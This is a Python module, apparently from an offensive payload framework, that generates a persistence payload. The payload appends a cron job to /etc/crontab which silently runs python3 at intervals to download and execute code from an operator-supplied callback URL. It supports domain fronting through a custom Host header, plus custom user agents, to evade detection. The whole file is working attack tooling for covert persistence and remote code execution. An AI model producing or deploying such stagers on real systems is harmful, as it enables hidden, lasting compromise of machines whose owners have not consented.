from payloads.modules.python.common import urllib_callback
from payloads.modules.python.persist.common import crontab_append


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Appends a urllib stager to the crontab',
        }

        self.options = {
            'Schedule': {
                'Description': 'Cron expression defining the schedule',
                'Required': True,
                'Value': '30 * * * *'
            },
            'Crontab Path': {
                'Description': 'The path to the crontab file',
                'Required': True,
                'Value': '/etc/crontab'
            },
            'Python Binary': {
                'Description': 'The Python binary to use',
                'Required': True,
                'Value': 'python3'
            },
            'Callback URL': {
                'Description': 'The callback URL to retrieve Python code from',
                'Required': True,
                'Type': 'url',
                'Value': ''
            },
            'Host Header': {
                'Description': '(Optional) Specify a custom Host header (i.e. for domain fronting)',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'User Agent': {
                'Description': '(Optional) Specify a custom user agent',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
            'Regex': {
                'Description': '(Optional) Specify a regular expression to extract Python code from the response',
                'Required': False,
                'Type': 'text',
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        callback = urllib_callback(url=self.options['Callback URL']['Value'],
                                   host_header=self.options['Host Header']['Value'],
                                   user_agent=self.options['User Agent']['Value'],
                                   regex=self.options['Regex']['Value'],
                                   try_except_wrap=False)

        command = '({0} -c "{1}" &) &> /dev/null'.format(self.options['Python Binary']['Value'], callback)
        code = crontab_append(self.options['Crontab Path']['Value'],
                              self.options['Schedule']['Value'],
                              command)
        return code
